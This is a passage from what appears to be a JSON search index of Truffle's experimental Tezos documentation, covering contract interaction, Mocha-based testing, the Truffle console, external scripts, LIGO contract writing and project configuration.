network"}, {"location": "docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts/#use-a-contract-at-a-specific-address", "text": "If you already have an address for a contract stored externally, you can create a new abstraction to represent the contract at that address, using the at() function provided by the top-level abstraction object: truffle ( development ) > let specificInstance = await SimpleStorage . at ( \"KT1Rt8CozyFb1HFhdkK7BLEcURsCtMxCYs1b\" ); truffle ( development ) > await newInstance . storage () BigNumber { s : 1 , e : 0 , c : [ 3 ] }", "title": "Use a contract at a specific address"}, {"location": "docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts/#further-reading", "text": "The contract abstractions provided by Truffle wouldn't have been possible without the amazing Taquito library that does a lot of the heavy lifing for what you see above. Check out their documentation for more information.", "title": "Further reading"}, {"location": "docs/tezos/truffle/getting-started/testing-your-tezos-contracts/", "text": "Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Testing Your Tezos Contracts \u00b6 Framework \u00b6 Truffle comes standard with an automated testing framework to make testing your contracts a breeze. This framework lets you write simple and manageable tests from Javascript and Typescript. Location \u00b6 All test files should be located in the ./test directory. Truffle will only run test files with the following file extensions: .js , .ts , .es , .es6 , and .jsx . All other files are ignored. Command \u00b6 To run all tests, simply run: $ truffle test Alternatively, you can specify a path to a specific file you want to run, e.g., $ truffle test ./path/to/test/file.js Clean-room environment \u00b6 Truffle provides a clean room environment when running your test files. When running your tests, Truffle will re-deploy all of your migrations at the beginning of every test file to ensure you have a fresh set of contracts to test against. Speed and reliability considerations \u00b6 The above clean room environment is a trade off between speed and test maintainability, but at times can be slow. We originally built Ganache for Ethereum to make running Ethereum-based tests significantly faster, where the test framework can take advantage of testing-specific features. We hope to do the same for Tezos. Please reach out to TQ and let them know you'd like a version of Ganache for Tezos! Writing Tests in JavaScript \u00b6 Truffle uses the Mocha testing framework and Chai for assertions to provide you with a solid framework from which to write your JavaScript tests. Let's dive in and see how Truffle builds on top of Mocha to make testing your contracts a breeze. Note: If you're unfamiliar with writing unit tests in Mocha, please see Mocha's documentation before continuing. Use contract() instead of describe() \u00b6 Structurally, your tests should remain largely unchanged from that of Mocha: Your tests should exist in the ./test directory, they should end with a .js extension (generally), and they should contain code that Mocha will recognize as an automated test. What makes Truffle tests different from that of Mocha is the contract() function: This function works exactly like describe() except it enables Truffle's clean-room features described above. It works like this: Before each contract() function is run, your contracts are redeployed to the running Tezos client so the tests within it run with a clean contract state. The contract() function provides a list of accounts made available by your Tezos client which you can use to write tests. Since Truffle uses Mocha under the hood, you can still use describe() to run normal Mocha tests whenever Truffle clean-room features are not required. Use contract abstractions within your tests \u00b6 Contract abstractions are the basis for making contract interaction possible from JavaScript (they're basically our flux capacitor ). Because Truffle has no way of detecting which contracts you'll need to interact with within your tests, you'll need to ask for those contracts explicitly. You do this by using the artifacts.require() method, a method provided by Truffle that allows you to request a usable contract abstraction for a specific Tezos contract. As you'll see in the example below, you can then use this abstraction to make sure your contracts are working properly. For more information on using contract abstractions, see the Interacting With Your Contracts section. Using artifacts.require() \u00b6 Using artifacts.require() within your tests works the same way as using it within your migrations; you just need to pass the name of the contract. See the artifacts.require() documentation in the Migrations section for detailed usage. Using the Tezos object \u00b6 A Tezos object is available in each test file, provided by the Taquito interaction library . You can find an example of its usage here . You'll want to use this object for interactions with Tezos clients that aren't included by default within Truffle's contract abstraction. Examples \u00b6 Using .then \u00b6 Here's an example test provided in the Tezos Truffle Box . Note the use of the contract() function and our use of artifacts.require() for interacting directly with our contracts. File: ./test/simpleStorage.test.js const SimpleStorage = artifacts . require ( \"SimpleStorage\" ); contract ( 'SimpleStorage' , () => { it ( \"...should store the integer 89.\" , ( done ) => { var simpleStorageInstance ; SimpleStorage . deployed (). then ( function ( instance ) { simpleStorageInstance = instance ; return simpleStorageInstance . main ( 89 ); }). then ( function ( tx ) { return simpleStorageInstance . storage (); }). then ( function ( storedInt ) { assert . equal ( storedInt , 89 , \"The integer 89 was not stored.\" ); }); }); }); This test will produce the following output: Contract: SimpleStorage \u221a ...should store the integer 89 ( 283ms ) 1 passing ( 283ms ) Using async/await \u00b6 Here is a similar example, but using async/await notation. As you'll notice, this syntax is much more straightforward. const SimpleStorage = artifacts . require ( \"SimpleStorage\" ); contract ( 'SimpleStorage' , () => { it ( \"...should store the integer 89.\" , async () => { const simpleStorageInstance = await SimpleStorage . deployed () await simpleStorageInstance . main ( 89 ); const storedInt = await simpleStorageInstance . storage (); assert . equal ( storedInt , 89 , \"The integer 89 was not stored.\" ); }); }); This test will produce identical output to the previous example. Specifying tests \u00b6 You can limit the tests being executed to a specific file as follows: truffle test ./test/simpleStorage.js See the full command reference for more information. Advanced \u00b6 Truffle gives you access to Mocha's configuration so you can change how Mocha behaves. See the project configuration section for more details.", "title": "Testing Your Tezos Contracts"}, {"location": "docs/tezos/truffle/getting-started/testing-your-tezos-contracts/#testing-your-tezos-contracts", "text": "", "title": "Testing Your Tezos Contracts"}, {"location": "docs/tezos/truffle/getting-started/testing-your-tezos-contracts/#framework", "text": "Truffle comes standard with an automated testing framework to make testing your contracts a breeze. This framework lets you write simple and manageable tests from Javascript and Typescript.", "title": "Framework"}, {"location": "docs/tezos/truffle/getting-started/testing-your-tezos-contracts/#location", "text": "All test files should be located in the ./test directory. Truffle will only run test files with the following file extensions: .js , .ts , .es , .es6 , and .jsx . All other files are ignored.", "title": "Location"}, {"location": "docs/tezos/truffle/getting-started/testing-your-tezos-contracts/#command", "text": "To run all tests, simply run: $ truffle test Alternatively, you can specify a path to a specific file you want to run, e.g., $ truffle test ./path/to/test/file.js", "title": "Command"}, {"location": "docs/tezos/truffle/getting-started/testing-your-tezos-contracts/#clean-room-environment", "text": "Truffle provides a clean room environment when running your test files. When running your tests, Truffle will re-deploy all of your migrations at the beginning of every test file to ensure you have a fresh set of contracts to test against.", "title": "Clean-room environment"}, {"location": "docs/tezos/truffle/getting-started/testing-your-tezos-contracts/#speed-and-reliability-considerations", "text": "The above clean room environment is a trade off between speed and test maintainability, but at times can be slow. We originally built Ganache for Ethereum to make running Ethereum-based tests significantly faster, where the test framework can take advantage of testing-specific features. We hope to do the same for Tezos. Please reach out to TQ and let them know you'd like a version of Ganache for Tezos!", "title": "Speed and reliability considerations"}, {"location": "docs/tezos/truffle/getting-started/testing-your-tezos-contracts/#writing-tests-in-javascript", "text": "Truffle uses the Mocha testing framework and Chai for assertions to provide you with a solid framework from which to write your JavaScript tests. Let's dive in and see how Truffle builds on top of Mocha to make testing your contracts a breeze. Note: If you're unfamiliar with writing unit tests in Mocha, please see Mocha's documentation before continuing.", "title": "Writing Tests in JavaScript"}, {"location": "docs/tezos/truffle/getting-started/testing-your-tezos-contracts/#use-contract-instead-of-describe", "text": "Structurally, your tests should remain largely unchanged from that of Mocha: Your tests should exist in the ./test directory, they should end with a .js extension (generally), and they should contain code that Mocha will recognize as an automated test. What makes Truffle tests different from that of Mocha is the contract() function: This function works exactly like describe() except it enables Truffle's clean-room features described above. It works like this: Before each contract() function is run, your contracts are redeployed to the running Tezos client so the tests within it run with a clean contract state. The contract() function provides a list of accounts made available by your Tezos client which you can use to write tests. Since Truffle uses Mocha under the hood, you can still use describe() to run normal Mocha tests whenever Truffle clean-room features are not required.", "title": "Use contract() instead of describe()"}, {"location": "docs/tezos/truffle/getting-started/testing-your-tezos-contracts/#use-contract-abstractions-within-your-tests", "text": "Contract abstractions are the basis for making contract interaction possible from JavaScript (they're basically our flux capacitor ). Because Truffle has no way of detecting which contracts you'll need to interact with within your tests, you'll need to ask for those contracts explicitly. You do this by using the artifacts.require() method, a method provided by Truffle that allows you to request a usable contract abstraction for a specific Tezos contract. As you'll see in the example below, you can then use this abstraction to make sure your contracts are working properly. For more information on using contract abstractions, see the Interacting With Your Contracts section.", "title": "Use contract abstractions within your tests"}, {"location": "docs/tezos/truffle/getting-started/testing-your-tezos-contracts/#using-artifactsrequire", "text": "Using artifacts.require() within your tests works the same way as using it within your migrations; you just need to pass the name of the contract. See the artifacts.require() documentation in the Migrations section for detailed usage.", "title": "Using artifacts.require()"}, {"location": "docs/tezos/truffle/getting-started/testing-your-tezos-contracts/#using-the-tezos-object", "text": "A Tezos object is available in each test file, provided by the Taquito interaction library . You can find an example of its usage here . You'll want to use this object for interactions with Tezos clients that aren't included by default within Truffle's contract abstraction.", "title": "Using the Tezos object"}, {"location": "docs/tezos/truffle/getting-started/testing-your-tezos-contracts/#examples", "text": "", "title": "Examples"}, {"location": "docs/tezos/truffle/getting-started/testing-your-tezos-contracts/#using-then", "text": "Here's an example test provided in the Tezos Truffle Box . Note the use of the contract() function and our use of artifacts.require() for interacting directly with our contracts. File: ./test/simpleStorage.test.js const SimpleStorage = artifacts . require ( \"SimpleStorage\" ); contract ( 'SimpleStorage' , () => { it ( \"...should store the integer 89.\" , ( done ) => { var simpleStorageInstance ; SimpleStorage . deployed (). then ( function ( instance ) { simpleStorageInstance = instance ; return simpleStorageInstance . main ( 89 ); }). then ( function ( tx ) { return simpleStorageInstance . storage (); }). then ( function ( storedInt ) { assert . equal ( storedInt , 89 , \"The integer 89 was not stored.\" ); }); }); }); This test will produce the following output: Contract: SimpleStorage \u221a ...should store the integer 89 ( 283ms ) 1 passing ( 283ms )", "title": "Using .then"}, {"location": "docs/tezos/truffle/getting-started/testing-your-tezos-contracts/#using-asyncawait", "text": "Here is a similar example, but using async/await notation. As you'll notice, this syntax is much more straightforward. const SimpleStorage = artifacts . require ( \"SimpleStorage\" ); contract ( 'SimpleStorage' , () => { it ( \"...should store the integer 89.\" , async () => { const simpleStorageInstance = await SimpleStorage . deployed () await simpleStorageInstance . main ( 89 ); const storedInt = await simpleStorageInstance . storage (); assert . equal ( storedInt , 89 , \"The integer 89 was not stored.\" ); }); }); This test will produce identical output to the previous example.", "title": "Using async/await"}, {"location": "docs/tezos/truffle/getting-started/testing-your-tezos-contracts/#specifying-tests", "text": "You can limit the tests being executed to a specific file as follows: truffle test ./test/simpleStorage.js See the full command reference for more information.", "title": "Specifying tests"}, {"location": "docs/tezos/truffle/getting-started/testing-your-tezos-contracts/#advanced", "text": "Truffle gives you access to Mocha's configuration so you can change how Mocha behaves. See the project configuration section for more details.", "title": "Advanced"}, {"location": "docs/tezos/truffle/getting-started/using-the-console-with-tezos/", "text": "Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Using the Truffle Console with Tezos \u00b6 Sometimes it's nice to work with your contracts interactively for testing and debugging purposes, or for executing transactions by hand. Truffle provides you an easy way to do this via an interactive console, with your contracts available and ready to use. Command \u00b6 To launch the console, run the following from your project folder: truffle console Truffle will immediately look for a network definition called development in the configuration, and connect to it, if available. You can override this using the --network <name> option or customize the development network settings. See more details in the Networks section as well as the command reference . When you load the console, you'll immediately see the following prompt: truffle ( development ) > This tells you you're running within a Truffle console using the development network. Features \u00b6 The Truffle console provides most of the features available in the Truffle command line tool. For instance, you can type migrate --reset within the console, and it will be interpreted the same as if you ran truffle migrate --reset on the command line from within your Truffle project. Additionally, the console has the following features: All of your compiled contracts are available and ready for use, via objects like SimpleStorage , which are given the same names as your contracts. After each command (such as migrate --reset ) your contracts are reprovisioned so you can start using the newly assigned addresses and binaries immediately. Example \u00b6 Here's an example using the SimpleStorage contract that comes with the tezos-example Truffle box. In this example, we first run the deploy command, which deploys our contracts to the configured network (equivalent to running truffle deploy from the shell). We then use the supplied contract abstraction to get an object that represents the deployed SimpleStorage contract; call its main() function, creating a new transaction; and then get the contract's data after the transaction completed successfully. truffle ( development ) > deploy 1 _deploy_simple_storage . js ========================== Deploying 'SimpleStorage' ------------------------- > operation hash : opNAUau1XwLzhLJud4XmabRppE81QkZaWm2EcUNeMsxjN2qnRDf > Blocks : 1 Seconds : 24 ... // truncated output truffle ( development ) > let instance = await SimpleStorage . deployed () truffle ( development ) > await instance . main ( 2 ) // Make transaction against main() function { tx : 'op8HbSFaHACRQrVZT7SmHjpRwqa9fDVxb6Zjwcyj57jwEgzKpcd' , ... } // transaction output truffle ( development ) > await instance . storage () // Get storage data BigNumber { s : 1 , e : 0 , c : [ 2 ] } For more information using the contract abstractions made available in the console, see the Interacting With Your Tezos Contracts section. Commands available \u00b6 You can run the following commands from within the console: build compile create debug deploy exec help install migrate networks opcode publish run test version If a Truffle command is not available, it is because it is not relevant for an existing project (for example, init ) wouldn't make sense (for example, develop or console ). See full command reference for more information.", "title": "Using Truffle Console"}, {"location": "docs/tezos/truffle/getting-started/using-the-console-with-tezos/#using-the-truffle-console-with-tezos", "text": "Sometimes it's nice to work with your contracts interactively for testing and debugging purposes, or for executing transactions by hand. Truffle provides you an easy way to do this via an interactive console, with your contracts available and ready to use.", "title": "Using the Truffle Console with Tezos"}, {"location": "docs/tezos/truffle/getting-started/using-the-console-with-tezos/#command", "text": "To launch the console, run the following from your project folder: truffle console Truffle will immediately look for a network definition called development in the configuration, and connect to it, if available. You can override this using the --network <name> option or customize the development network settings. See more details in the Networks section as well as the command reference . When you load the console, you'll immediately see the following prompt: truffle ( development ) > This tells you you're running within a Truffle console using the development network.", "title": "Command"}, {"location": "docs/tezos/truffle/getting-started/using-the-console-with-tezos/#features", "text": "The Truffle console provides most of the features available in the Truffle command line tool. For instance, you can type migrate --reset within the console, and it will be interpreted the same as if you ran truffle migrate --reset on the command line from within your Truffle project. Additionally, the console has the following features: All of your compiled contracts are available and ready for use, via objects like SimpleStorage , which are given the same names as your contracts. After each command (such as migrate --reset ) your contracts are reprovisioned so you can start using the newly assigned addresses and binaries immediately.", "title": "Features"}, {"location": "docs/tezos/truffle/getting-started/using-the-console-with-tezos/#example", "text": "Here's an example using the SimpleStorage contract that comes with the tezos-example Truffle box. In this example, we first run the deploy command, which deploys our contracts to the configured network (equivalent to running truffle deploy from the shell). We then use the supplied contract abstraction to get an object that represents the deployed SimpleStorage contract; call its main() function, creating a new transaction; and then get the contract's data after the transaction completed successfully. truffle ( development ) > deploy 1 _deploy_simple_storage . js ========================== Deploying 'SimpleStorage' ------------------------- > operation hash : opNAUau1XwLzhLJud4XmabRppE81QkZaWm2EcUNeMsxjN2qnRDf > Blocks : 1 Seconds : 24 ... // truncated output truffle ( development ) > let instance = await SimpleStorage . deployed () truffle ( development ) > await instance . main ( 2 ) // Make transaction against main() function { tx : 'op8HbSFaHACRQrVZT7SmHjpRwqa9fDVxb6Zjwcyj57jwEgzKpcd' , ... } // transaction output truffle ( development ) > await instance . storage () // Get storage data BigNumber { s : 1 , e : 0 , c : [ 2 ] } For more information using the contract abstractions made available in the console, see the Interacting With Your Tezos Contracts section.", "title": "Example"}, {"location": "docs/tezos/truffle/getting-started/using-the-console-with-tezos/#commands-available", "text": "You can run the following commands from within the console: build compile create debug deploy exec help install migrate networks opcode publish run test version If a Truffle command is not available, it is because it is not relevant for an existing project (for example, init ) wouldn't make sense (for example, develop or console ). See full command reference for more information.", "title": "Commands available"}, {"location": "docs/tezos/truffle/getting-started/writing-external-scripts-with-tezos/", "text": "Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Writing External Scripts \u00b6 Often you may want to run external scripts that interact with your deployed contracts, or in some cases deploy new contracts! Truffle provides an easy way to do this, bootstrapping your contracts based on your desired network and connecting to your Tezos client automatically per your project configuration . Command \u00b6 To run an external script, perform the following: $ truffle exec <path/to/file.js> Refer to Truffle Commands Reference for more information about this command, such as what options it accepts. File structure \u00b6 In order for external scripts to be run correctly, Truffle expects them to export a function that takes a single parameter as a callback: module . exports = function ( callback ) { // perform actions } You can do anything you'd like within this script, so long as the callback is called when the script finishes. The callback accepts an error as its first and only parameter. If an error is provided, execution will halt and the process will return a non-zero exit code. artifacts.require() \u00b6 Note that the artifacts.require() function available in migrations is also available to you within external scripts. Here's an example of how you might use it to deploy a new contract outside of Truffle's migration system: Filename: ./script.js const SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module . exports = callback => { SimpleStorage . new ( 3 ). then (( instance ) => { console . log ( \"New address:\" , instance . address ); callback (); }). catch ( callback ); }; The output would look like this: $ truffle exec ./script.js Using network 'development' . New address: KT1JZ8JQ4ziGCsQJcTegNcByYGW32ZhXD217", "title": "Writing External Scripts with Tezos"}, {"location": "docs/tezos/truffle/getting-started/writing-external-scripts-with-tezos/#writing-external-scripts", "text": "Often you may want to run external scripts that interact with your deployed contracts, or in some cases deploy new contracts! Truffle provides an easy way to do this, bootstrapping your contracts based on your desired network and connecting to your Tezos client automatically per your project configuration .", "title": "Writing External Scripts"}, {"location": "docs/tezos/truffle/getting-started/writing-external-scripts-with-tezos/#command", "text": "To run an external script, perform the following: $ truffle exec <path/to/file.js> Refer to Truffle Commands Reference for more information about this command, such as what options it accepts.", "title": "Command"}, {"location": "docs/tezos/truffle/getting-started/writing-external-scripts-with-tezos/#file-structure", "text": "In order for external scripts to be run correctly, Truffle expects them to export a function that takes a single parameter as a callback: module . exports = function ( callback ) { // perform actions } You can do anything you'd like within this script, so long as the callback is called when the script finishes. The callback accepts an error as its first and only parameter. If an error is provided, execution will halt and the process will return a non-zero exit code.", "title": "File structure"}, {"location": "docs/tezos/truffle/getting-started/writing-external-scripts-with-tezos/#artifactsrequire", "text": "Note that the artifacts.require() function available in migrations is also available to you within external scripts. Here's an example of how you might use it to deploy a new contract outside of Truffle's migration system: Filename: ./script.js const SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module . exports = callback => { SimpleStorage . new ( 3 ). then (( instance ) => { console . log ( \"New address:\" , instance . address ); callback (); }). catch ( callback ); }; The output would look like this: $ truffle exec ./script.js Using network 'development' . New address: KT1JZ8JQ4ziGCsQJcTegNcByYGW32ZhXD217", "title": "artifacts.require()"}, {"location": "docs/tezos/truffle/getting-started/writing-tezos-contracts/", "text": "Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Writing Tezos Contracts \u00b6 Smart contracts in Tezos are written in the LIGO programming language . We recommend you familiarize yourself with the language before continuing. Their documentation is excellent. Main language site Online sandbox Documentation Note! LIGO supports three different syntaxes out of the box: CamelLIGO, PascalLIGO, and ReasonLIGO. For all examples in this documentation, we use PascalLIGO. Example Contract & Overview \u00b6 All contracts within a Tezos-based Truffle project are stored in the ./contracts directory. An example contract looks like the following: // variant defining pseudo multi-entrypoint actions type action is | Increment of int | Decrement of int function add (const a : int ; const b : int) : int is a + b function subtract (const a : int ; const b : int) : int is a - b // real entrypoint that re-routes the flow based on the action provided function main (const p : action ; const s : int) : (list(operation) * int) is ((nil : list(operation)), case p of | Increment (n) -> add (s, n) | Decrement (n) -> subtract (s, n) end) There's some important takeaways to note when writing LIGO contracts: By default, all LIGO contracts have a single entry point called main , expected by Truffle. For multiple entry points, see below. The last parameter to the entry point function represents the current state of the contract, and is sent to the function via the underlying protocol. All LIGO contracts return two things: A list of further operations the protocol should perform, and the final state of the contract after execution of the entry point. Defining Multiple Entry Points \u00b6 You'll notice that the comments in the example contract above suggest there are multiple entry points beyond main() . Conceptually there are multiple entry points -- increment and decrement -- but under the hood, main() is technically the single entery point of the contract. To code a contract with multiple entry points that Truffle can take advantage of, you'll need to follow the example above. Start by defining an enum-like type called action with values relative to the functions being called, and then pass the action as the first value into main() . As you'll see in the Interacting With Your Contracts section, if Truffle detects an action type as the first parameter in main() , it'll treat your contract as though it has multiple entry points, and make those entry points easy to call from outside the blockchain. Including Other Contracts \u00b6 Sometimes it's nice to organize your code in multiple files. Fortunately, the LIGO compiler does this for you. To do so, check out the LIGO documentation for more. You'll still need one contract that contains a main() function, though you can organize other contract code in other files as needed. How do I compile? \u00b6 It's easy. See the Compiling Tezos Contracts section for more!", "title": "Writing Tezos Contracts"}, {"location": "docs/tezos/truffle/getting-started/writing-tezos-contracts/#writing-tezos-contracts", "text": "Smart contracts in Tezos are written in the LIGO programming language . We recommend you familiarize yourself with the language before continuing. Their documentation is excellent. Main language site Online sandbox Documentation Note! LIGO supports three different syntaxes out of the box: CamelLIGO, PascalLIGO, and ReasonLIGO. For all examples in this documentation, we use PascalLIGO.", "title": "Writing Tezos Contracts"}, {"location": "docs/tezos/truffle/getting-started/writing-tezos-contracts/#example-contract-overview", "text": "All contracts within a Tezos-based Truffle project are stored in the ./contracts directory. An example contract looks like the following: // variant defining pseudo multi-entrypoint actions type action is | Increment of int | Decrement of int function add (const a : int ; const b : int) : int is a + b function subtract (const a : int ; const b : int) : int is a - b // real entrypoint that re-routes the flow based on the action provided function main (const p : action ; const s : int) : (list(operation) * int) is ((nil : list(operation)), case p of | Increment (n) -> add (s, n) | Decrement (n) -> subtract (s, n) end) There's some important takeaways to note when writing LIGO contracts: By default, all LIGO contracts have a single entry point called main , expected by Truffle. For multiple entry points, see below. The last parameter to the entry point function represents the current state of the contract, and is sent to the function via the underlying protocol. All LIGO contracts return two things: A list of further operations the protocol should perform, and the final state of the contract after execution of the entry point.", "title": "Example Contract &amp; Overview"}, {"location": "docs/tezos/truffle/getting-started/writing-tezos-contracts/#defining-multiple-entry-points", "text": "You'll notice that the comments in the example contract above suggest there are multiple entry points beyond main() . Conceptually there are multiple entry points -- increment and decrement -- but under the hood, main() is technically the single entery point of the contract. To code a contract with multiple entry points that Truffle can take advantage of, you'll need to follow the example above. Start by defining an enum-like type called action with values relative to the functions being called, and then pass the action as the first value into main() . As you'll see in the Interacting With Your Contracts section, if Truffle detects an action type as the first parameter in main() , it'll treat your contract as though it has multiple entry points, and make those entry points easy to call from outside the blockchain.", "title": "Defining Multiple Entry Points"}, {"location": "docs/tezos/truffle/getting-started/writing-tezos-contracts/#including-other-contracts", "text": "Sometimes it's nice to organize your code in multiple files. Fortunately, the LIGO compiler does this for you. To do so, check out the LIGO documentation for more. You'll still need one contract that contains a main() function, though you can organize other contract code in other files as needed.", "title": "Including Other Contracts"}, {"location": "docs/tezos/truffle/getting-started/writing-tezos-contracts/#how-do-i-compile", "text": "It's easy. See the Compiling Tezos Contracts section for more!", "title": "How do I compile?"}, {"location": "docs/tezos/truffle/reference/configuring-tezos-projects/", "text": "Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Configuring your Tezos Project \u00b6 Location \u00b6 Your configuration file is called truffle-config.js and is located at the root of your project directory. This file is a Javascript file and can execute any code necessary to create your configuration. It must export an object representing your project configuration like the example below. const { mnemonic , secret , password , email } = require ( \"./faucet.json\" ); module . exports = { // see <https://trufflesuite.com/docs/tezos/truffle/reference/configuring-tezos-projects> // for more details on how to specify configuration options! networks : { development : { host : \"https://delphinet.smartpy.io\" , port : 443 , network_id : \"*\" , secret , mnemonic , password , email , type : \"tezos\" } } }; Configuring your project to deploy to a public test network \u00b6 The above configuration defines a single development network pointed at the public Delphinet test network. You can see how this is set up in context by following our quickstart . Developing on public test nets can be limiting for a number of reasons (acquiring test net tokens, performance, and internet connectivity, among others). Fortunately, there's a local solution. Setting up a local test network with Flextesa \u00b6 Enter Flextesa. \"Flextesa\" is short for flexible test sandboxes , and can help you quickly set up a Tezos environment locally. Our example Tezos box comes with scripts to spin up a flextesa environment with zero-work. Check out the documentation . If you're going to set up a flextesa environment on your own, you'll want to perform the following: Run the flextesa environment via docker ( see example ) Configure your Truffle project to point to the flextesa environment. ( see example ) Import the default private key into your Truffle configuration. ( see example ) Suported configuration options \u00b6 networks \u00b6 Specifies which networks are available for deployment during migrations. When compiling and running migrations on a specific network, contract artifacts will be saved and recorded for later use. When your contract abstractions detect that your Tezos client is connected to a specific network, they'll use the contract artifacts associated that network to simplify app deployment. The networks object, shown below, is keyed by a network name and contains a corresponding object that defines the parameters of the network. The networks option is required, as if you have no network configuration, Truffle will not be able to deploy your contracts. The default network configuration provided by the Tezos example Truffle box specifies multiple available networks, including mainnet and the Babylon testnet. To configure Truffle to connect to other networks, simply add more named networks and specify the corresponding network id. The network name is used for user interface purposes, such as when running your migrations on a specific network: $ truffle migrate --network delphinet Example: networks : { development : { host : \"https://delphinet.smartpy.io\" , port : 443 , network_id : \"*\" , type : \"tezos\" }, delphinet : { host : \"https://delphinet.smartpy.io\" , port : 443 , network_id : \"*\" , type : \"tezos\" }, mainnet : { host : \"https://mainnet.smartpy.io\" , port : 443 , network_id : \"*\" , type : \"tezos\" }, zeronet : { host : \"https://zeronet.smartpy.io\" , port : 443 , network_id : \"*\" , type : \"tezos\" } } contracts_directory \u00b6 The default directory for uncompiled contracts is ./contracts relative to the project root. If you wish to keep your contracts in a different directory you may specify a contracts_directory property. Example: To have Truffle find contracts in ./allMyStuff/someStuff/theContractFolder (recursively) at compile time: module . exports = { contracts_directory : \"./allMyStuff/someStuff/theContractFolder\" , networks : { // ... } }; Note : In addition to specifying a relative path, you can also use globs/regular expressions to selectively compile contracts. contracts_build_directory \u00b6 The default output directory for compiled contracts is ./build/contracts relative to the project root. This can be changed with the contracts_build_directory key. Examples: To place the built contract artifacts in ./output/contracts : module . exports = { contracts_build_directory : \"./output\" , networks : { // ... } }; The built contract artifacts do not need to be inside the project root: module . exports = { contracts_build_directory : \"../../../output\" , networks : { // ... } }; Absolute paths will also work. This is not recommended though, as an absolute path may not exist when compiled on another system. If you use absolute paths on Windows, make sure to use double backslashes for paths (example: C:\\\\Users\\\\Username\\\\output ). migrations_directory \u00b6 The default migrations directory is ./migrations relative to the project root. This can be changed with the migrations_directory key. Example: module . exports = { migrations_directory : \"./allMyStuff/someStuff/theMigrationsFolder\" , networks : { // ... } }; mocha \u00b6 Configuration options for the MochaJS testing framework. This configuration expects an object as detailed in Mocha's documentation . Example: mocha : { useColors : true } plugins \u00b6 Note : This feature is new and still in a barebones state. Please let us know how we can improve it! Provides Truffle with a list of installed third-party extensions installed as NPM package dependencies. Truffle plugin support is currently limited to plugins that define custom workflow commands. For more information, see Third-Party Plugin Commands .", "title": "Configuring Your Project"}, {"location": "docs/tezos/truffle/reference/configuring-tezos-projects/#configuring-your-tezos-project", "text": "", "title": "Configuring your Tezos Project"}, {"location": "docs/tezos/truffle/reference/configuring-tezos-projects/#location", "text": "Your configuration file is called truffle-config.js and is located at the root of your project directory. This file is a Javascript file and can execute any code necessary to create your configuration. It must export an object representing your project configuration like the example below. const { mnemonic , secret , password , email } = require ( \"./faucet.json\" ); module . exports = { // see <https://trufflesuite.com/docs/tezos/truffle/reference/configuring-tezos-projects> // for more details on how to specify configuration options! networks : { development : { host : \"https://delphinet.smartpy.io\" , port : 443 , network_id : \"*\" , secret , mnemonic , password , email , type : \"tezos\" } } };", "title": "Location"}, {"location": "docs/tezos/truffle/reference/configuring-tezos-projects/#configuring-your-project-to-deploy-to-a-public-test-network", "text": "The above configuration defines a single development network pointed at the public Delphinet test network. You can see how this is set up in context by following our quickstart . Developing on public test nets can be limiting for a number of reasons (acquiring test net tokens, performance, and internet connectivity, among others). Fortunately, there's a local solution.", "title": "Configuring your project to deploy to a public test network"}, {"location": "docs/tezos/truffle/reference/configuring-tezos-projects/#setting-up-a-local-test-network-with-flextesa", "text": "Enter Flextesa. \"Flextesa\" is short for flexible test sandboxes , and can help you quickly set up a Tezos environment locally. Our example Tezos box comes with scripts to spin up a flextesa environment with zero-work. Check out the documentation . If you're going to set up a flextesa environment on your own, you'll want to perform the following: Run the flextesa environment via docker ( see example ) Configure your Truffle project to point to the flextesa environment. ( see example ) Import the default private key into your Truffle configuration. ( see example )", "title": "Setting up a local test network with Flextesa"}, {"location": "docs/tezos/truffle/reference/configuring-tezos-projects/#suported-configuration-options", "text": "", "title": "Suported configuration options"}, {"location": "docs/tezos/truffle/reference/configuring-tezos-projects/#networks", "text": "Specifies which networks are available for deployment during migrations. When compiling and running migrations on a specific network, contract artifacts will be saved and recorded for later use. When your contract abstractions detect that your Tezos client is connected to a specific network, they'll use the contract artifacts associated that network to simplify app deployment. The networks object, shown below, is keyed by a network name and contains a corresponding object that defines the parameters of the network. The networks option is required, as if you have no network configuration, Truffle will not be able to deploy your contracts. The default network configuration provided by the Tezos example Truffle box specifies multiple available networks, including mainnet and the Babylon testnet. To configure Truffle to connect to other networks, simply add more named networks and specify the corresponding network id. The network name is used for user interface purposes, such as when running your migrations on a specific network: $ truffle migrate --network delphinet Example: networks : { development : { host : \"https://delphinet.smartpy.io\" , port : 443 , network_id : \"*\" , type : \"tezos\" }, delphinet : { host : \"https://delphinet.smartpy.io\" , port : 443 , network_id : \"*\" , type : \"tezos\" }, mainnet : { host : \"https://mainnet.smartpy.io\" , port : 443 , network_id : \"*\" , type : \"tezos\" }, zeronet : { host : \"https://zeronet.smartpy.io\" , port : 443 , network_id : \"*\" , type : \"tezos\" } }", "title": "networks"}, {"location": "docs/tezos/truffle/reference/configuring-tezos-projects/#contracts_directory", "text": "The default directory for uncompiled contracts is ./contracts relative to the project root. If you wish to keep your contracts in a different directory you may specify a contracts_directory property. Example: To have Truffle find contracts in ./allMyStuff/someStuff/theContractFolder (recursively) at compile time: module . exports = { contracts_directory : \"./allMyStuff/someStuff/theContractFolder\" , networks : { // ... } }; Note : In addition to specifying a relative path, you can also use globs/regular expressions to selectively compile contracts.", "title": "contracts_directory"}, {"location": "docs/tezos/truffle/reference/configuring-tezos-projects/#contracts_build_directory", "text": "The default output directory for compiled contracts is ./build/contracts relative to the project root. This can be changed with the contracts_build_directory key. Examples: To place the built contract artifacts in ./output/contracts : module . exports = { contracts_build_directory : \"./output\" , networks : { // ... } }; The built contract artifacts do not need to be inside the project root: module . exports = { contracts_build_directory : \"../../../output\" , networks : { // ... } }; Absolute paths will also work. This is not recommended though, as an absolute path may not exist when compiled on another system. If you use absolute paths on Windows, make sure to use double backslashes for paths (example: C:\\\\Users\\\\Username\\\\output ).", "title": "contracts_build_directory"}, {"location": "docs/tezos/truffle/reference/configuring-tezos-projects/#migrations_directory", "text": "The default migrations directory is ./migrations relative to the project root. This can be changed with the migrations_directory key. Example: module . exports = { migrations_directory : \"./allMyStuff/someStuff/theMigrationsFolder\" , networks : { // ... } };", "title": "migrations_directory"}, {"location": 